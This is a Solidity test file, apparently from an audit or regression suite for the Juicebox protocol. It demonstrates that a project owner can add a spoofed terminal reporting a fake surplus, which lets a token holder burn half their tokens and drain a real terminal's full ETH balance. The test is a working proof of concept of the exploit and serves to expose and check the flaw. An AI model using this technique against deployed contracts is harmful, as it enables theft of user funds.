// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

import {TestBaseWorkflow} from "../helpers/TestBaseWorkflow.sol";
import {IJBController} from "../../src/interfaces/IJBController.sol";
import {IJBDirectory} from "../../src/interfaces/IJBDirectory.sol";
import {IJBTerminal} from "../../src/interfaces/IJBTerminal.sol";
import {JBMultiTerminal} from "../../src/JBMultiTerminal.sol";
import {JBConstants} from "../../src/libraries/JBConstants.sol";
import {JBAccountingContext} from "../../src/structs/JBAccountingContext.sol";
import {JBFundAccessLimitGroup} from "../../src/structs/JBFundAccessLimitGroup.sol";
import {JBRulesetConfig} from "../../src/structs/JBRulesetConfig.sol";
import {JBRulesetMetadata} from "../../src/structs/JBRulesetMetadata.sol";
import {JBSplitGroup} from "../../src/structs/JBSplitGroup.sol";
import {JBTerminalConfig} from "../../src/structs/JBTerminalConfig.sol";
import {IJBRulesetApprovalHook} from "../../src/interfaces/IJBRulesetApprovalHook.sol";

/// @notice Verifies that `scopeCashOutsToLocalBalances` trusts every terminal in the directory,
/// even though settlement still comes from the specific terminal the holder cashes out through.
contract CrossTerminalSurplusSpoof_Local is TestBaseWorkflow {
    IJBController private _controller;
    IJBDirectory private _directory;
    JBMultiTerminal private _terminal;
    address private _projectOwner;
    address private _holder;
    uint32 private _nativeCurrency;
    uint256 private _projectId;

    function setUp() public override {
        super.setUp();

        _controller = jbController();
        _directory = jbDirectory();
        _terminal = jbMultiTerminal();
        _projectOwner = multisig();
        _holder = beneficiary();
        _nativeCurrency = uint32(uint160(JBConstants.NATIVE_TOKEN));

        JBRulesetMetadata memory metadata = JBRulesetMetadata({
            reservedPercent: 0,
            cashOutTaxRate: 0,
            baseCurrency: _nativeCurrency,
            pausePay: false,
            pauseCreditTransfers: false,
            allowOwnerMinting: true,
            allowSetCustomToken: true,
            allowTerminalMigration: false,
            allowSetTerminals: true,
            allowSetController: false,
            allowAddAccountingContext: true,
            allowAddPriceFeed: false,
            ownerMustSendPayouts: false,
            holdFees: false,
            scopeCashOutsToLocalBalances: true,
            useDataHookForPay: false,
            useDataHookForCashOut: false,
            dataHook: address(0),
            metadata: 0,
            allowCrossProjectFeeFreeInflows: false
        });

        JBRulesetConfig[] memory rulesetConfigs = new JBRulesetConfig[](1);
        rulesetConfigs[0] = JBRulesetConfig({
            mustStartAtOrAfter: 0,
            duration: 0,
            weight: 1000e18,
            weightCutPercent: 0,
            approvalHook: IJBRulesetApprovalHook(address(0)),
            metadata: metadata,
            splitGroups: new JBSplitGroup[](0),
            fundAccessLimitGroups: new JBFundAccessLimitGroup[](0)
        });

        JBAccountingContext[] memory contexts = new JBAccountingContext[](1);
        contexts[0] = JBAccountingContext({token: JBConstants.NATIVE_TOKEN, decimals: 18, currency: _nativeCurrency});

        JBTerminalConfig[] memory terminalConfigs = new JBTerminalConfig[](1);
        terminalConfigs[0] = JBTerminalConfig({terminal: _terminal, accountingContextsToAccept: contexts});

        _projectId = _controller.launchProjectFor({
            owner: _projectOwner,
            projectUri: "spoofed-surplus",
            rulesetConfigurations: rulesetConfigs,
            terminalConfigurations: terminalConfigs,
            memo: ""
        });
    }

    function test_partialCashOutCanDrainLocalTerminalUsingSpoofedSiblingSurplus() external {
        vm.deal(_holder, 1 ether);

        vm.prank(_holder);
        uint256 minted = _terminal.pay{value: 1 ether}({
            projectId: _projectId,
            token: JBConstants.NATIVE_TOKEN,
            amount: 1 ether,
            beneficiary: _holder,
            minReturnedTokens: 0,
            memo: "",
            metadata: ""
        });

        assertEq(address(_terminal).balance, 1 ether, "terminal should hold the paid ETH");

        address spoofedTerminal = makeAddr("spoofedTerminal");
        IJBTerminal[] memory terminals = new IJBTerminal[](2);
        terminals[0] = IJBTerminal(address(_terminal));
        terminals[1] = IJBTerminal(spoofedTerminal);

        vm.prank(_projectOwner);
        _directory.setTerminalsOf(_projectId, terminals);

        vm.mockCall(
            spoofedTerminal,
            abi.encodeCall(IJBTerminal.currentSurplusOf, (_projectId, new address[](0), 18, _nativeCurrency)),
            abi.encode(1 ether)
        );

        uint256 holderBalanceBefore = _holder.balance;

        vm.prank(_holder);
        uint256 reclaimed = _terminal.cashOutTokensOf({
            holder: _holder,
            projectId: _projectId,
            cashOutCount: minted / 2,
            tokenToReclaim: JBConstants.NATIVE_TOKEN,
            minTokensReclaimed: 0,
            beneficiary: payable(_holder),
            metadata: new bytes(0)
        });

        assertEq(reclaimed, 1 ether, "spoofed global surplus should let a half burn reclaim the full local balance");
        assertEq(_holder.balance - holderBalanceBefore, 1 ether, "holder should receive the full terminal balance");
        assertEq(address(_terminal).balance, 0, "the honest terminal should be fully drained");
        assertEq(
            jbTokens().totalBalanceOf(_holder, _projectId),
            minted / 2,
            "the holder should keep half their project tokens after draining the terminal"
        );
    }
}
